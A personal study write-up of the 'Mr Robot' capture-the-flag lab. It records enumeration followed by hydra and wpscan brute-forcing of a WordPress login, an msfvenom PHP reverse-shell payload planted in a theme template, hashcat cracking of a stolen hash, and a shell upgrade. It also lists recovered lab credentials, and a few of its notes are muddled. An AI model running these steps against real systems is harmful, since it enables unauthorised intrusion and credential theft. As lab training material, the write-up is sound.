---
tags:
  - programming/hacking/practice
---
# You're on your own kid

3 flags - try and find them. Good luck

#  00_Nmap_basic

Doing the initial scan of the address 

Port 22 - closed ssh port
Port 80 - website is running
 - no title

Port 443 - open

# website 

Some kind of terminal - like website for fsociety. 

# 01_dirbuster

```
    /admin
    /robots
    /readme (funny)
    /image has some kind of website.
```


# First key 

The first key can be found using /robots. key-1-of-3.txt is hidden. For to /`key-1-of-3.txt` to find the key

# Further Enumeration 

Before I just go and find the answer on some website, let's do a little more enumeration. Options from the start is
prepare, fsociety, inform, question, wakeup, join
```
    /inform     # sports suck
    prepare doesn't go anywhere
    /fsociety   # plays a view 
    /question   # videos and stuff 
    /wakeup     # Plays some kind of video
    /join       # More text in fake terminal
```

## View page source from the main page

The main page does not have much information in the source other ASCII art "You are not alone"


# wp-admin

What can we do know that this is a wordpress site? Apparently there is a program called `wpscan` that will break into
wordpress site. 

Before that we need to know the username at very least. Now, if you are kind of desperate you could go through all the
value in the fsocity.dic file and try them. But there are LOT of values. Could also try to brute force the username with
hydra using the following:

```

hydra -L fsocity.dic -p test mrrobot.thm http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"


```

You could use use burpsuite to do something similar, though hydra will do parallel requests - I'm not sure if burpsuite
will. 

After further investigation I found that burpsuite will work but it will take approximately an eternity. Burpsuite is
rate limited where hydra will HAMMER the endpoint. With that out of the way, let's breakdown the hydra command

```
    hydra           # Run hydra
    -L $WORDLIST    # Specifies the wordlist
    -p test         # Set password to fixed value
    mrrobot.thm     # Think that this is the website
    http-post-form  # type of command?
    "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fmrrobot.thm%2Fwp-admin%2F&testcookie=1:F=Invalid username"

```

What in the world is mrrobot.thm? I think that this is actually supposed to be the IP address. Finally the part that is
in double quotes is probably the full request path to send. I'm not sure what the `F=Invalid username` part means as
this is not in the request that I made. Perhaps this is just because of the person making the request?

## fsocity.txt file

The file contains a LOT of lines in random order - let's make that a little more clean. Sort the value and keep only the
unique values `sort fsocity.txt | uniq > unique.txt`. Now if we use this file we don't be trying the same values
multiple times. Which will save a LOT of time - the deduplicated files is nearly 75x smaller than the original 

# Cracking with Hydra

Had to learn how to use Hydra. See [Hydra](Hydra.md) to see what I learned. 

Making an actual call: 

```
    hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.127.253 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect." -V -t 4
```

Okay, that's not what I actually used. What I actually used was

```bash
    hydra -L fsocity.dic -p test 10.10.42.161 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.42.161%2Fwp-admin%2F&testcookie=1:F=Invalid usernam" -t 4 | tee 05_hyra_bf.log
```

NOTE - username: elliot

Now to break the password for elliot. 

```bash
    hydra -l elliot  -P ./unique.txt 10.10.42.161 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.42.161%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username" -t 4 | tee 06_hyra_bf_pass.log
```

Okay, that didn't work for some reason. It would go for a while and then stop working. So we are going to try `wpscan`
instead

So, we are going to use wpscan

```bash
    wpscan --url http://192.168.0.18 --passwords /location/of/wordlist/fsocitysortunique.dic --usernames elliot
```

I couldn't figure this out so I went ahead just did a scan without the wordlist or username. UPDATE - I figured it out.
The flags have changes from V2 to V3. This has been updated in the command above.

username ==> usernames
wordlist ==> passwords

This was STUPId fast - 32 seconds instead of the many hours it was going to take with hydra. Unsure why Hydra took so
long and wpscan didn't. I'm guessing wpscan is doing something fancy under thet hood

NOTE - password:  ER28-0652

# Reverse shell time

Reverse shell time. Create the reverse shell with msfvenom and the right payload. Probably could have used metasploit to
search for the exploit if we wanted. Notes about reverse shells here: [Reverse Shells](Reverse%20Shells.md)

Command to create the reverse shell

```bash
    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.32 LPORT=4444 -f raw -o payload.php
```

This breaks down to: 

```bash
    -p      # Payload to use
    LHOST   # Local host to reverse to
    LPORT   # Local port to reverse to
    -f      # encoding of payload. Raw = None
    -o      # output file name
```

## How to read the reverse shell

The reverse shell can be handled through metasploit. I think it could be done with netcat too, but metasploit can too.
Like so... 

```
msfconsole
$ use exploit/multi/handler
$ set payload php/meterpreter/reverse_tcp
$ set LHOST 192.168.0.32
$ set LPORT 4444
$ run
```

Open the payload.php file, paste into the 404 template and.... wait?

Yep, it opens a meterpreter session back to the local computer. Let's upgrade from the `meterpreter` session to the
`shell` by using the command `shell`.

## Get comfortable in your new shell

```bash
pwd
whoami
cd /
ls
cd home
ls
cd robot
ls
cat key-2-of-3.txt  # Password denied
```

How do we know where this is? We just magically do. Need to know some more advanced file stuff. But this is good enough.
Thankfully we have a very nice password.raw-md5 file to look at and steal

File contents: `robot:c3fcd3d76192e4007dfb496cca67e13b`

## Using hashcat to break the password

Let's learn hashcat! 

Cracked it with 

```bash
    hashcat -m 0 ./09_hashcat_vals.txt /usr/share/wordlists/rockyou.txt
```

username: root
password: abcdefghijklmnopqrstuvwxyz
abcdefghijklmnopqrstuvwxyz

`su root` returns that it must be run from a terminal. Now we need to get a terminal in the computer

## Privileges Escalation Time

Let's make a terminal with Python. Simplified - fucking magic. 

`python -c 'import pty; pty.spawn("/bin/bash")'`

Python pty is a Pseudo-terminal utility module. Import it, spawn a new shell and BOOM! Now you are in a shell.


## Now, finding the last key

Find the last key using 
```bash
    find / -perm +6000 2>/dev/null | grep '/bin/'
```

I think that we are using this to find the root processes.
